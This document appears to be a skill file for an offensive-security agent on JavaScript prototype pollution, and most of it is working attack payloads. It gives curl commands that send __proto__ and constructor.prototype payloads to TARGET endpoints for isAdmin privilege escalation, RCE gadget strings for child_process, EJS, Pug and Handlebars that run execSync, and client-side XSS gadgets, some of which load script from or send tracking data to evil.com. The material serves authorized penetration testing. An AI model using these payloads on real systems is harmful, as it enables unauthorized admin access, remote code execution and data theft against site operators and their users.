---
name: prototype-pollution
description: JavaScript prototype pollution attacks covering client-side and server-side exploitation, gadget chains, and framework-specific bypasses
---

# Prototype Pollution

Prototype pollution is a JavaScript vulnerability where an attacker modifies `Object.prototype`, causing all objects in the application to inherit attacker-controlled properties. This leads to XSS (client-side), RCE (server-side), authentication bypass, and denial of service.

## Attack Surface

- Any JavaScript endpoint accepting nested JSON/object input (APIs, configuration endpoints)
- Client-side JavaScript processing URL parameters, hash fragments, or JSON responses
- Node.js applications using recursive merge, deep clone, or object assignment utilities
- npm packages: lodash, jQuery.extend, deep-extend, merge, hoek, defaults-deep

## Key Vulnerabilities

### Server-Side Prototype Pollution

```bash
# Test via JSON body with __proto__
curl -sk "https://TARGET/api/user/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Alternative pollution paths
curl -sk "https://TARGET/api/update" -X POST \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# Nested pollution
curl -sk "https://TARGET/api/merge" -X POST \
  -H "Content-Type: application/json" \
  -d '{"a":{"__proto__":{"polluted":"true"}}}'

# Check if pollution took effect
curl -sk "https://TARGET/api/user/profile" | grep -i "admin\|polluted"

# Pollution for RCE via child_process
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}'

# Pollution via query string (Express qs parser)
curl -sk "https://TARGET/api/search?__proto__[isAdmin]=true"
curl -sk "https://TARGET/api/search?constructor[prototype][isAdmin]=true"
```

### Server-Side RCE Gadgets

```bash
# child_process.exec/spawn pollution
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}'

# EJS template engine RCE
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'

# Pug/Jade template engine RCE
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","val":"x]});process.mainModule.require(\"child_process\").execSync(\"id\")//"}}}' 

# Handlebars RCE
curl -sk "https://TARGET/api/settings" -X PUT \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"main":"{{#with \"s]\"as |string|}}  {{#with \"e]\"}}    {{#with split as |conslist|}}      {{this.pop}}      {{this.push (lookup string.sub \"constructor\")}}      {{this.pop}} {{#with string.split as |codelist|}}        {{this.pop}}        {{this.push \"return process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\");\"}}        {{this.pop}}        {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}}      {{/with}}    {{/with}}  {{/with}}{{/with}}"}}'
```

### Client-Side Prototype Pollution

```javascript
// Test in browser console
// Pollute Object.prototype via URL hash
// If app does: merge(config, parseQuery(location.hash))
location.hash = "#__proto__[innerHTML]=<img/src/onerror=alert(1)>"

// Via URL query params
// https://TARGET/page?__proto__[srcdoc]=<script>alert(1)</script>
// https://TARGET/page?__proto__[onload]=alert(1)
// https://TARGET/page?__proto__[src]=//evil.com/xss.js

// DOM XSS via polluted properties
// If any code does: element.innerHTML = obj.content (where content is inherited from proto)
```

### Client-Side XSS Gadgets

```javascript
// jQuery gadget — $.extend pollutes, $.html() renders
// Pollute: __proto__.innerHTML = "<img src=x onerror=alert(1)>"
// Then any $(element).html(obj.value) renders XSS

// Angular.js gadget
// Pollute: __proto__.templateUrl = "//evil.com/template"
// Pollute: __proto__.template = "<img src=x onerror=alert(1)>"

// Closure Library gadget
// Pollute: __proto__.sanitizedContentType = 1
// Then goog.html.SafeHtml renders unsanitized content

// Google Analytics / Tag Manager
// Pollute: __proto__.transport_url = "//evil.com/collect"
// Exfiltrate tracking data to attacker
```

### Detection via Property Reflection

```python
import requests

url = "https://TARGET/api/endpoint"
pollute_payloads = [
    {"__proto__": {"xalgorix_pp_test": "polluted"}},
    {"constructor": {"prototype": {"xalgorix_pp_test": "polluted"}}},
]

for payload in pollute_payloads:
    r = requests.post(url, json=payload, verify=False, timeout=5)

# Check if pollution persists by requesting a new object
r = requests.get(f"{url}?new=true", verify=False, timeout=5)
if "xalgorix_pp_test" in r.text or "polluted" in r.text:
    print("[VULN] Server-side prototype pollution confirmed!")
```

## Testing Methodology

1. **Identify merge operations** — look for endpoints that merge/update JSON objects (settings, profiles, configs)
2. **Test __proto__ injection** — send `{"__proto__":{"test":"polluted"}}` and check if test property appears on subsequent responses
3. **Test constructor.prototype** — alternative path that bypasses __proto__ filters
4. **Identify template engine** — EJS, Pug, Handlebars each have specific RCE gadgets
5. **Test client-side** — check if URL params or hash are parsed into objects via merge utilities
6. **Test RCE gadgets** — try template engine gadgets, child_process pollution, Node.js-specific chains

## Validation

1. Property set via `__proto__` appears on subsequent unrelated object responses
2. RCE via template engine gadget — command output returned in response
3. Client-side XSS triggered via polluted DOM property
4. Auth bypass — `isAdmin` property inherited from polluted prototype

## False Positives

- `__proto__` is treated as regular property name (not prototype chain modification)
- Application uses `Object.create(null)` — objects without prototype
- `Object.freeze(Object.prototype)` — prototype is immutable
- Content-Type doesn't accept JSON (pollution requires JSON parsing)

## Impact

- **Critical**: RCE via server-side pollution + template engine gadgets
- **Critical**: Authentication bypass via `isAdmin`/`role` pollution
- **High**: XSS via client-side pollution + DOM gadgets
- **Medium**: DoS via polluting properties that cause crashes

## Pro Tips

1. `constructor.prototype` bypasses `__proto__` keyword filters — always test both
2. Express `qs` parser converts `?__proto__[x]=y` to `{__proto__: {x: "y"}}` — test query strings
3. Server-side PP often has no immediate visible effect — you need to find a GADGET for exploitation
4. Common gadgets: `outputFunctionName` (EJS), `block` (Pug), `main` (Handlebars), `shell` (child_process)
5. Client-side PP through $.extend, Object.assign, or custom merge is very common in SPAs
6. Test with harmless canary first (`__proto__[xalgorix_test]=true`) then check if it propagates
7. Lodash < 4.17.12, jQuery < 3.4.0, and many npm packages have known PP vulnerabilities
8. PP can be chained with SSRF to achieve RCE on internal Node.js services
